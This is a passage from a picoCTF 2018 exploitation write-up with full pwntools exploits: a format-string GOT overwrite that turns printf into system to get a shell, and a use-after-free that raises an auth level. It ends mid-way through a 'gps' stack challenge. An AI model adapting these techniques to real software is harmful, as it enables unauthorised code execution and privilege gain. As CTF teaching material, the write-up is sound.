<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;stdio.h&gt;</span><span style=color:#ff79c6>
</span><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;sys/types.h&gt;</span><span style=color:#ff79c6>
</span><span style=color:#ff79c6></span>
<span style=color:#8be9fd>void</span> <span style=color:#50fa7b>vuln</span>(){
    <span style=color:#8be9fd>char</span> input[<span style=color:#bd93f9>128</span>] <span style=color:#ff79c6>=</span> {};

    system(<span style=color:#f1fa8c>&#34;echo input your message:&#34;</span>);
    read(<span style=color:#bd93f9>0</span>,input,<span style=color:#bd93f9>127</span>);

    printf(input);	<span style=color:#6272a4>/* format-string vulnerability */</span>
    puts(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>);

    puts(<span style=color:#f1fa8c>&#34;Thanks for sending the message!&#34;</span>);
}
</code></pre></td></tr></table>
</div>
</div><p>Running checksec shows that GOT and PLT are writeable</p>
<p>We can leverage the format string to overwrite the puts and printf in Global Offset Table (GOT):</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>checksec ./echoback
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> <span style=color:#f1fa8c>&#39;/home/ctf/ctf_writeups/picoCTF2018/binary-exploitation/resources/echo-back/echoback&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO		&lt;-- GOT and PLT are writeable
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span style=color:#ff79c6>(</span>0x8048000<span style=color:#ff79c6>)</span>
~~

The exploit is as simple as:
1. Overwrite puts with vuln
2. Overwrite <span style=color:#8be9fd;font-style:italic>printf</span> with system
The result is described below:
~~~c
void vuln<span style=color:#ff79c6>(){</span>
    char input<span style=color:#ff79c6>[</span>128<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>{}</span>;

    system<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;echo input your message:&#34;</span><span style=color:#ff79c6>)</span>;
    read<span style=color:#ff79c6>(</span>0,input,127<span style=color:#ff79c6>)</span>;

    system<span style=color:#ff79c6>(</span>input<span style=color:#ff79c6>)</span>;	/* printf<span style=color:#ff79c6>(</span>input<span style=color:#ff79c6>)</span>;*/
    vuln<span style=color:#ff79c6>()</span>;		/* puts<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;\n&#34;</span><span style=color:#ff79c6>)</span>; 	 */

    vuln<span style=color:#ff79c6>()</span>;		/* puts<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;Thanks for sending the message!&#34;</span><span style=color:#ff79c6>)</span>; */
<span style=color:#ff79c6>}</span>
</code></pre></td></tr></table>
</div>
</div><ol>
<li>After the format string exploitation, instead of executing <code>puts("\n")</code>, vuln() will be recursively called and the user will be prompted again to input a message.</li>
<li>Except, that this time, the user input would be passed to the system function instead of printf.</li>
<li>The user can simply manually pass any command as input, such as <code>ls</code> or <code>cat flag.txt</code> or <code>/bin/sh</code> to obtain a shell</li>
</ol>
<p>Full exploit:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>

<span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>

DEV <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
h, p <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>, <span style=color:#bd93f9>22462</span>

PREFIX <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;/bin/sh#&#39;</span>	<span style=color:#6272a4># The hash sign is needed to comment-out and ignore the rest of the format-string payload</span>
PREFIX <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>

e <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#39;./echoback&#39;</span>)

log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Address of puts() .got.plt: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(<span style=color:#8be9fd;font-style:italic>hex</span>(e<span style=color:#ff79c6>.</span>got[<span style=color:#f1fa8c>&#39;puts&#39;</span>])))
log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Address of printf() .got.plt: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(<span style=color:#8be9fd;font-style:italic>hex</span>( e<span style=color:#ff79c6>.</span>got[<span style=color:#f1fa8c>&#39;printf&#39;</span>])))
log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Address of vuln(): </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(<span style=color:#8be9fd;font-style:italic>hex</span>(e<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;vuln&#39;</span>])))
log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Address of system() .plt: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(<span style=color:#8be9fd;font-style:italic>hex</span>(e<span style=color:#ff79c6>.</span>plt[<span style=color:#f1fa8c>&#39;system&#39;</span>])))

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_process</span>():
    <span style=color:#ff79c6>if</span> DEV:
        s <span style=color:#ff79c6>=</span> process(<span style=color:#f1fa8c>&#39;./echoback&#39;</span>)
    <span style=color:#ff79c6>else</span>:
        s <span style=color:#ff79c6>=</span> remote(h, p)
    <span style=color:#ff79c6>return</span> s

<span style=color:#6272a4># Function called in order to send the fmt string payload</span>
<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>send_payload</span>(proc, payload):
    <span style=color:#8be9fd;font-style:italic>print</span>(enhex(PREFIX<span style=color:#ff79c6>+</span>payload))
    proc<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>&#39;message:&#39;</span>,PREFIX<span style=color:#ff79c6>+</span>payload)  <span style=color:#6272a4>#PREFIX needs to be here, otherwise it affects autofmt.offset</span>

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>payload</span>():
    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>execute_fmt</span>(payload):
        proc <span style=color:#ff79c6>=</span> get_process()
        send_payload(proc, payload)
        <span style=color:#ff79c6>return</span> proc<span style=color:#ff79c6>.</span>recvall()

    <span style=color:#6272a4>#Automatically get the offset of the Formatted String Attack</span>
    autofmt <span style=color:#ff79c6>=</span> FmtStr(execute_fmt)
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#39;offset&#39;</span>, autofmt<span style=color:#ff79c6>.</span>offset)

    writes <span style=color:#ff79c6>=</span> {e<span style=color:#ff79c6>.</span>got[<span style=color:#f1fa8c>&#39;puts&#39;</span>]:   e<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;vuln&#39;</span>],
          e<span style=color:#ff79c6>.</span>got[<span style=color:#f1fa8c>&#39;printf&#39;</span>]: e<span style=color:#ff79c6>.</span>plt[<span style=color:#f1fa8c>&#39;system&#39;</span>]}

    payload <span style=color:#ff79c6>=</span> fmtstr_payload(autofmt<span style=color:#ff79c6>.</span>offset, writes, numbwritten<span style=color:#ff79c6>=</span><span style=color:#8be9fd;font-style:italic>len</span>(PREFIX))
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Payload: </span><span style=color:#f1fa8c>{}{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(PREFIX, enhex(payload)))
    <span style=color:#ff79c6>return</span> payload

<span style=color:#6272a4>#send payload</span>
s <span style=color:#ff79c6>=</span> get_process()
send_payload(s, payload())
s<span style=color:#ff79c6>.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><p>Alternatively, because payload() actually executes the format-string, it is possible to prefix the payload with a PREFIX='/bin/sh#'. The hash sign is needed to comment-out and ignore the rest of the format-string payload.</p>
<h2 id=are-you-root>are-you-root</h2>
<ul>
<li>source: <a href=./resources/are-you-root/auth.c>auth.c</a></li>
<li>binary: <a href=./resources/are-you-root/auth>auth</a></li>
</ul>
<p>This is an example of use-after-free Attack (Heap exploitation).</p>
<p>Note that this attack may not be possible as-is on a modern heap implementation. Success to run the exploit depends on which heap implementation the target operating system is using.
Therefore, exploit code adjustments along with thorough understanding of the heap implementation are needed to have this technique works.</p>
<p>This 64bits binary has a Canary enabled, and no buffer overflow is possible</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>checksec auth
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> <span style=color:#f1fa8c>&#39;/home/ctf/kali/picoCTF/binary-exploitation/are-you-root/auth&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found	&lt;-- Canary is enabled
    NX:       NX enabled
    PIE:      No PIE <span style=color:#ff79c6>(</span>0x400000<span style=color:#ff79c6>)</span>
</code></pre></td></tr></table>
</div>
</div><p>However, there is a heap overflow vulnerability on the user struct which can be exploited with a &lsquo;use-after-free&rsquo; attack</p>
<p>Indeed, the login command enable us to write the user->name on the heap</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#ff79c6>struct</span> user {
  <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>name;
  auth_level_t level;
};
[...]
user <span style=color:#ff79c6>=</span> (<span style=color:#ff79c6>struct</span> user <span style=color:#ff79c6>*</span>)malloc(<span style=color:#ff79c6>sizeof</span>(<span style=color:#ff79c6>struct</span> user));
user<span style=color:#ff79c6>-&gt;</span>name <span style=color:#ff79c6>=</span> strdup(arg);
</code></pre></td></tr></table>
</div>
</div><p>The reset command will free(user->name), However it is not using calloc to zero out the memory&mldr; So the data will remain</p>
<p>A subsequent login command may reallocate the exact same memory space, with the same data if not overwritten</p>
<ol>
<li>login with a name having a size of 128 bits: first 64bits filled with &lsquo;a&rsquo;, second 64bits filled with \x05</li>
<li>reset to free the 128bits memory</li>
<li>login with a smaller name of size below 64bits results in a smaller memory allocation of 64bits at the previous location. The next 64 bits are not overwritten and occupy the place of user->level</li>
</ol>
<p>Therefore, the \x05 which was before part of user->name is now occupying the user->level location</p>
<pre tabindex=0><code>    step 1: first login		step 2: reset			step 3: second login
&lt;---- name -----&gt;&lt;- level -&gt;	&lt;---- free -----&gt;		&lt; name &gt;&lt; level &gt;
+---------------+----------+	+---------------+----------+	+---------------+----------+
| 'a'*8 | \x05	| \x00	   |	| freed	| \x05  | \x00	   |	| 'A'   | \x05	| \x00	   |
+---------------+----------+	+---------------+----------+	+---------------+----------+
</code></pre><p>Full exploit:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>
<span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>

DEV <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
REQUESTED_ACCESS_LEVEL <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>5</span>

<span style=color:#ff79c6>if</span> DEV:
    r <span style=color:#ff79c6>=</span> process(<span style=color:#f1fa8c>&#39;./auth&#39;</span>)
<span style=color:#ff79c6>else</span>:
    r <span style=color:#ff79c6>=</span> remote(<span style=color:#f1fa8c>&#34;2018shell.picoctf.com&#34;</span>, <span style=color:#bd93f9>41208</span>)

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>send_command</span>(command):
    r<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#34;&gt; &#34;</span>)
    r<span style=color:#ff79c6>.</span>sendline(command)
    <span style=color:#ff79c6>return</span> r<span style=color:#ff79c6>.</span>recvline()

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>show</span>():
    <span style=color:#ff79c6>return</span> send_command(<span style=color:#f1fa8c>&#34;show&#34;</span>)

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>login</span>(name):
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Logging in as </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c> (</span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>)&#34;</span><span style=color:#ff79c6>.</span>format(name, enhex(name)))
    <span style=color:#ff79c6>return</span> send_command(<span style=color:#f1fa8c>&#34;login &#34;</span> <span style=color:#ff79c6>+</span> name)

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>set_auth</span>(auth):
    <span style=color:#ff79c6>return</span> send_command(<span style=color:#f1fa8c>&#34;set-auth &#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>str</span>(auth))

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_flag</span>():
    <span style=color:#ff79c6>return</span> send_command(<span style=color:#f1fa8c>&#34;get-flag&#34;</span>)

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>reset</span>():
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Performing reset&#34;</span>)
    <span style=color:#ff79c6>return</span> send_command(<span style=color:#f1fa8c>&#34;reset&#34;</span>)

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>quit</span>():
    <span style=color:#ff79c6>return</span> send_command(<span style=color:#f1fa8c>&#34;quit&#34;</span>)

login(<span style=color:#f1fa8c>&#34;a&#34;</span><span style=color:#ff79c6>*</span><span style=color:#bd93f9>8</span> <span style=color:#ff79c6>+</span> p64(REQUESTED_ACCESS_LEVEL))
reset()
login(<span style=color:#f1fa8c>&#34;A&#34;</span>)
s <span style=color:#ff79c6>=</span> show()
log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Login info: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(s))
<span style=color:#6272a4>#if &#34;[{}]&#34;.format(REQUESTED_ACCESS_LEVEL) in s:</span>
log<span style=color:#ff79c6>.</span>success(<span style=color:#f1fa8c>&#34;Flag: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(get_flag()))
</code></pre></td></tr></table>
</div>
</div><h2 id=gps>gps</h2>
<ul>
<li>source: <a href=./resources/gps/gps.c>gps.c</a></li>
<li>binary: <a href=./resources/gps/gps.c>gps</a></li>
</ul>
<p>A goood explanation of <a href=http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/>checkseck and NX</a>:</p>
<p>The abbreviation NX stands for non-execute or non-executable segment. It means that the application, when loaded in memory, does not allow any of its segments to be both writable and executable. The idea here is that writable memory should never be executed (as it can be manipulated) and vice versa.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>checksec gps
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> <span style=color:#f1fa8c>&#39;/home/ctf/kali/picoCTF/binary-exploitation/gps/gps&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled		&lt;-- NX <span style=color:#8be9fd;font-style:italic>disabled</span> <span style=color:#ff79c6>=</span>&gt; stack is both writeable and executable
    PIE:      No PIE <span style=color:#ff79c6>(</span>0x400000<span style=color:#ff79c6>)</span>
    RWX:      Has RWX segments
</code></pre></td></tr></table>
</div>
</div><ol>
<li>The query_position() function will leak the approximate location of the <code>stk</code> local variable, which is equivalent to have an approximate location of the stack location</li>
<li>Also there is a huge <code>buffer</code> of size 0x1000 above the stack position of this <code>stk</code> address in the stack</li>
</ol>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
